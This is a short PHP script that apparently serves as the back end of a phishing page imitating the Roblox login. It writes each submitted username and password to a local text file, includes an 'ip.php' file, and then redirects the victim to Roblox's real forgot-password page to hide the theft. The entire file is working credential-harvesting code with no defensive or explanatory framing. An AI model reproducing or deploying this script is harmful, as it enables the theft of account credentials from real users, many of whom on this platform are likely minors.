<?php
include "ip.php";
file_put_contents("usernames.txt", "Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] ."\n", FILE_APPEND);
header('Location: https://www.roblox.com/login/forgot-password-or-username');
exit();
?>